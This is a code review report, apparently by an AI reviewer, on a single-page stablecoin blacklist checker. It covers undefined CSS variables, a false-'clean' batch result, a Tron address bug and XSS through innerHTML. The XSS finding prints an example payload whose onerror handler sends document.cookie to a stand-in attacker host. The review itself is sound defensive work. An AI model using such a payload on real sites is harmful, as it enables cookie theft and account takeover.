---
phase: 01-ui-overhaul
reviewed: 2026-05-04T00:00:00Z
depth: standard
files_reviewed: 1
files_reviewed_list:
  - index.html
findings:
  critical: 4
  warning: 5
  info: 2
  total: 11
status: issues_found
---

# Phase 01: Code Review Report

**Reviewed:** 2026-05-04
**Depth:** standard
**Files Reviewed:** 1
**Status:** issues_found

## Summary

Single self-contained `index.html` reviewed at standard depth. The file implements a stablecoin blacklist checker with four tabs: Blacklist Check, Token Approvals, TX Tracer, and Batch Check. All CSS and JS are inline.

The most significant issues are: two undefined CSS custom properties that silently break borders on every interactive input/button/card across all tabs; a logic error producing false-"safe" results when all RPC calls fail; and XSS via `innerHTML` fed from sessionStorage data that originated from unsanitised user input. A secondary Tron hex-extraction bug may silently produce incorrect blacklist query results.

---

## Critical Issues

### CR-01: `--border2` and `--border3` CSS custom properties are never declared

**File:** `index.html:55` (first use; repeated on lines 56, 62, 65, 66, 80, 81, 130, 145, 152, 164, 169, 172, 173)

**Issue:** The `:root` block (lines 12–32) declares `--border` but never declares `--border2` or `--border3`. Both are used as border colours on every major interactive element: token-toggle buttons, address inputs, paste buttons, result action buttons, select fields, TX items, summary cards, the batch textarea, and the batch table. When a CSS custom property is not defined, it resolves to an empty value, which makes the `border` shorthand invalid and the border is silently dropped. All those elements render with no visible border outline — making the UI look broken (no distinction between surface and interactive elements) and destroying the designed aesthetic on every browser.

**Fix:**
Add the two missing variables to `:root`:
```css
:root {
  /* existing variables ... */
  --border2: #22253a;   /* slightly brighter than --border for interactive elements */
  --border3: #2e3150;   /* hover-state border, one step brighter still */
}
```
Adjust the hex values to match the intended design intent (they sit between `--border:#1a1b2e` and `--surface3:#1a1b2e`).

---

### CR-02: False "safe" result when all RPC calls fail (vacuous `every()`)

**File:** `index.html:592–593` (blacklist check); `index.html:761` (batch check)

**Issue:** In `runBlacklist`, after all chain checks complete:
```js
const def = results.filter(r => r !== null);
const allOk = def.length > 0 && def.every(r => r === false);
```
The `def.length > 0` guard is present here, so the blacklist check is **safe** on this path.

However in `runBatch` (line 761):
```js
const allOk = results.filter(r => r !== null).every(r => r === false);
```
There is **no length guard**. `[].every(fn)` returns `true` vacuously in JavaScript. When every RPC call for an address fails (all return `null`), `results.filter(r => r !== null)` is an empty array, `every()` returns `true`, and the address is displayed as `● CLEAN`. A network outage, a misconfigured RPC, or a deliberately bad RPC silently marks every address clean regardless of its actual status.

**Fix:**
```js
const definitive = results.filter(r => r !== null);
const anyBl  = definitive.some(r => r === true);
const allOk  = definitive.length > 0 && definitive.every(r => r === false);
if (anyBl)        cell.innerHTML = `... BLACKLISTED ...`;
else if (allOk)   cell.innerHTML = `... CLEAN ...`;
else              cell.innerHTML = `<span ...>⚠ Partial</span>`;
```

---

### CR-03: Stored XSS via `innerHTML` with unsanitised history data

**File:** `index.html:527–533`

**Issue:** `renderHist()` inserts history entries into the DOM using `innerHTML` with `short(h.addr)` in a template literal. `h.addr` is read from `sessionStorage` (line 417) where it was written by `saveHist(addr, ...)`. The `addr` value comes directly from the input field value or the `?address=` URL parameter (line 778), neither of which is sanitised.

`short()` only truncates — it does not escape HTML. An address string such as:
```
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```
passes `isEvm`/`isTron` validation (it won't, due to the regex), but a value like:
```
0x<script>alert(1)</script>aaaaaaaaaaaaaa
```
would fail address validation and be blocked at `runBlacklist`. However, if the sessionStorage is pre-seeded (e.g., via a shared browser profile or XSS from another origin in the same app later), or if address validation logic changes, the unescaped `innerHTML` path becomes a live XSS vector.

More concretely: line 579 also uses `innerHTML` with `c.name` and `c.short` from `CHAINS` config (static, so safe now), and line 660 injects `e.message` from a caught `Error` directly:
```js
res.innerHTML = `<div class="empty" style="color:var(--amber)">⚠ ${e.message}</div>`;
```
If a malicious/compromised RPC returns a JSON error whose `.message` contains HTML, this is a live XSS vector right now with no address validation gating it.

**Fix:**
Add a minimal HTML-escape utility and use it everywhere user-controlled or network-sourced strings are injected via `innerHTML`:
```js
const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
```
Then replace, e.g.:
```js
res.innerHTML = `<div class="empty" style="color:var(--amber)">⚠ ${esc(e.message)}</div>`;
```
and in `renderHist`:
```js
el.innerHTML = `<span class="hist-addr">${esc(short(h.addr))}</span>...`;
```

---

### CR-04: Tron address hex extraction is off-by-one — may produce wrong ABI parameter

**File:** `index.html:449`

**Issue:**
```js
async function checkTron(addr) {
  const hex = b58Dec(addr).substring(2, 42).padStart(64, '0');
```
`b58Dec` decodes a base58 string to a hex integer and pads it to 50 hex chars (25 bytes):
```js
return n.toString(16).padStart(50, '0');
```
A TRON address is 21 bytes = 42 hex chars. After `padStart(50,'0')`, the 42-char address occupies positions 8–49 in the 50-char string (8 leading zero chars). `substring(2, 42)` extracts chars at index 2–41 = 40 chars. Those 40 chars are: 6 chars of leading zero padding + the `41` network-prefix byte (2 chars) + first 32 chars of the 20-byte account address. It therefore includes the `41` TRON prefix byte in the ABI payload and drops the last 4 chars of the account address.

The correct extraction for an EVM-style 20-byte ABI `address` parameter is: drop the first 2 hex chars of the 42-char address (the `0x41` prefix byte), take the remaining 40 chars, then left-pad to 64:
```js
// b58Dec result is padStart(50,'0'): leading zeros + 42-char tron addr
const raw42 = b58Dec(addr).slice(-42);  // last 42 chars = the tron address
const hex   = raw42.slice(2).padStart(64, '0'); // drop '41' prefix, pad to 32 bytes
```

---

## Warnings

### WR-01: `.spin` spinner class not styled as a standalone element — broken in Batch tab

**File:** `index.html:105` (CSS definition); `index.html:750` (batch row use)

**Issue:** The spin animation is only declared inside `.block-status.scanning .spin`:
```css
.block-status.scanning .spin {
  width:10px; height:10px; border:1.5px solid var(--border); border-top-color:var(--accent);
  border-radius:50%; animation:spin .7s linear infinite; flex-shrink:0;
}
```
In the batch table, each pending row inserts `<div class="spin"></div>` (line 750) directly in a `<td>` — not inside a `.block-status.scanning` container. The CSS selector does not match; the div renders as an invisible 0×0 element with no border and no animation. Users see a blank cell while the address is being checked.

**Fix:**
Add a top-level `.spin` rule:
```css
.spin {
  display:inline-block;
  width:10px; height:10px;
  border:1.5px solid var(--border);
  border-top-color:var(--accent);
  border-radius:50%;
  animation:spin .7s linear infinite;
}
```

---

### WR-02: `traceTron` hardcodes the USDT contract regardless of selected token

**File:** `index.html:685`

**Issue:**
```js
async function traceTron(src, dst) {
  const url = `https://api.trongrid.io/v1/accounts/${src}/transactions/trc20?limit=200&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`;
```
The contract address `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` is the USDT/Tron contract, hardcoded. USDC does not exist on Tron (the Blacklist tab correctly validates for this), but there is no such guard in the TX Tracer. If a user selects USDC + Tron chain in the tracer (currently possible via `updateTraceChains` which populates Tron if USDT is active), the trace silently queries USDT transactions instead of returning an appropriate error. The `tok` return field in the mapped result also hardcodes `'USDT'` (line 691), so the displayed token label will always be USDT regardless of what was selected.

**Fix:**
Either remove Tron from the TX Tracer chain list for USDC, or pass the token's contract address into `traceTron` and use it:
```js
async function traceTron(src, dst, cfg) {
  const url = `https://api.trongrid.io/v1/accounts/${src}/transactions/trc20?limit=200&contract_address=${cfg.contract}`;
  // ...
  .map(tx => ({ ..., tok: cfg.name, ... }));
}
// caller:
txs = await traceTron(src, dst, cfg);
```

---

### WR-03: URL parameter `?address=` auto-runs check without validation feedback

**File:** `index.html:775–778`

**Issue:**
```js
const ua = p.get('address'), ut = p.get('token');
if (ut === 'USDT' || ut === 'USDC') setToken(ut);
if (ua) { document.getElementById('blInput').value = ua; runBlacklist(ua); }
```
`runBlacklist` is called with the raw URL parameter value without first switching to the Blacklist tab. If the active tab was changed before the URL was shared (this can't happen on first load, but `blToken` defaults to `USDT`) it will proceed. More importantly, `ua` is inserted into the input and directly into `history.replaceState` without sanitising. An attacker can craft a URL with a very long or specially formatted `?address=` value. While address validation inside `runBlacklist` will reject invalid addresses, the value is already written to the input field and to `sessionStorage` (via `saveHist`) before any error check runs — this exposes `sessionStorage` to pollution with attacker-controlled strings (relevant to CR-03).

Also, `setToken` is called with `ut` only when it passes the `==='USDT'||==='USDC'` check, which is correct. But the `blToken` module-level variable is not reset if `ut` is absent, so a share link without `?token=` will use whatever `blToken` was last set to by user interaction — currently mitigated because module state is fresh on page load. Low impact now, documented for awareness.

**Fix:**
Call `setToken` before `runBlacklist`, and clear the history entry created from a URL-driven check if the address is invalid (or only save history on successful resolution, not on error):
```js
if (ut === 'USDT' || ut === 'USDC') setToken(ut);
if (ua) {
  const sanitized = ua.trim().slice(0, 100); // cap length
  document.getElementById('blInput').value = sanitized;
  runBlacklist(sanitized);
}
```

---

### WR-04: `e.message` from RPC errors injected unescaped into `innerHTML`

**File:** `index.html:660`

**Issue:** (Highlighted separately from CR-03 because this is an active path with no address-validation gating)
```js
res.innerHTML = `<div class="empty" style="color:var(--amber)">⚠ ${e.message}</div>`;
```
This runs in the `runTrace` catch block. The `e.message` may originate from `j.error.message` in the `rpc()` function (line 435), which is the raw error message returned by the JSON-RPC endpoint. A compromised or malicious public RPC node can return arbitrary HTML in this field. This is a direct XSS path — no address regex stands between the RPC response and the DOM.

**Fix:** Escape the message before insertion (see `esc()` helper in CR-03).

---

### WR-05: History `renderHist` re-uses array index `i` as splice argument inside event listener — index drift on removal

**File:** `index.html:534`

**Issue:**
```js
hist.forEach((h, i) => {
  // ...
  el.querySelector('.hist-rm').addEventListener('click', e => {
    e.stopPropagation();
    hist.splice(i, 1);   // <-- 'i' captured by closure
    sessionStorage.setItem('cbk_h', JSON.stringify(hist));
    renderHist();
  });
});
```
The index `i` is captured at render time. After any removal, the `hist` array is shorter but the remaining DOM elements still hold their original index values in their closures. If the user deletes item 0 from a 3-item list, the remaining two elements now have stale closures pointing to old indices 1 and 2. After `renderHist()` is called, the list is redrawn from scratch, so the stale closures on the old elements are garbage-collected and new correct ones are attached. The re-render happens synchronously inside the `click` handler, so by the time the user can click again, the DOM is fresh. This is actually safe in practice, but is a fragile pattern.

A cleaner fix is to identify items by a stable key (e.g., `addr+token`) rather than array index:
```js
el.querySelector('.hist-rm').addEventListener('click', e => {
  e.stopPropagation();
  hist = hist.filter(x => !(x.addr === h.addr && x.token === h.token));
  sessionStorage.setItem('cbk_h', JSON.stringify(hist));
  renderHist();
});
```

---

## Info

### IN-01: Mobile breakpoint sets chain grid to 2 columns, overriding the earlier 2-column tablet rule redundantly

**File:** `index.html:224`

**Issue:** The tablet breakpoint at `max-width:1023px` (line 115) sets `.res-rows` to `repeat(2,1fr)`. The mobile breakpoint at `max-width:479px` (line 224) explicitly sets it again to `repeat(2,1fr)` — the same value. This is a no-op override; the intent in the comment is "2 columns on mobile" but the value was already 2 columns from the tablet rule. If the design intent was 1 column on very small screens, the rule is wrong. If 2 columns is correct on all sub-1024px screens, the mobile override is redundant dead CSS.

**Fix:** If 1 column is desired on `<480px`, change to:
```css
@media(max-width:479px) {
  .res-rows { grid-template-columns: 1fr; }
}
```
If 2 columns is intentional even on small phones, remove the duplicate declaration from the 479px block.

---

### IN-02: `blToken` module variable not guarded against concurrent `runBlacklist` calls re-using a stale token state

**File:** `index.html:416, 542–599`

**Issue:** `blToken` is module-level. `runBlacklist` reads it at call time (line 574: `const chains = CHAINS[blToken]...`). The user can click "USDT", start a scan, immediately click "USDC" to toggle the token, then the in-flight scan continues to use the original `blToken` value because it was captured in `chains` before the toggle. This is actually fine. However, the `saveHist(addr, blToken, outcome)` on line 598 saves the token value at the time the scan *completes*, not at the time it was *started* — if the user toggled the token mid-scan, the history entry records the wrong token label.

**Fix:** Capture `blToken` at scan start:
```js
async function runBlacklist(addrOverride) {
  const token = blToken; // capture at call time
  // ...
  const chains = CHAINS[token].filter(...);
  // ...
  saveHist(addr, token, outcome);
}
```

---

_Reviewed: 2026-05-04_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
